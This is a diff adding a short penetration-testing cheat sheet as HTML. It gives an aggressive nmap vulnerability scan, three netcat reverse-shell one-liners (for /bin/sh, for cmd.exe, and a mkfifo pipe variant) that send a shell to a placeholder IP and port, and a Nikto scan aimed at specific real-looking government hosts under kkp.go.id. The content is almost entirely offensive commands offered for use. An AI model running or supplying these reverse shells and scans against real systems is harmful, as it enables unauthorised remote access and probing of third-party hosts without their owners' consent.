@@ -1,0 +1,24 @@
+I"<h1 id="1-nmap">1. Nmap</h1>
+
+<blockquote>
+  <p>nmap -sV -vv -O -T5 –scan=vuln ip/subnet -oX filename.xml</p>
+</blockquote>
+
+<p>Scan all service and check operating system with aggresive scanning also with mod scanning vulnerability and make the output xml type with filename.xml (later can be open with zenmap)</p>
+
+<h1 id="2-reverse-shell">2. Reverse Shell</h1>
+
+<blockquote>
+  <p>nc <IP> <PORT> -e /bin/sh
+nc <IP> <PORT> -e C:\Windows\System32\cmd.exe
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc <IP> <PORT> &gt;/tmp/f</PORT></IP></PORT></IP></PORT></IP></p>
+</blockquote>
+
+<h1 id="3-nikto">3. Nikto</h1>
+
+<blockquote>
+  <p>perl nikto.pl -host kkp.go.id;www.wpi.kkp.go.id -output ~/kkp/random -Format htm</p>
+</blockquote>
+
+<p>scan target with output html</p>
+:ET
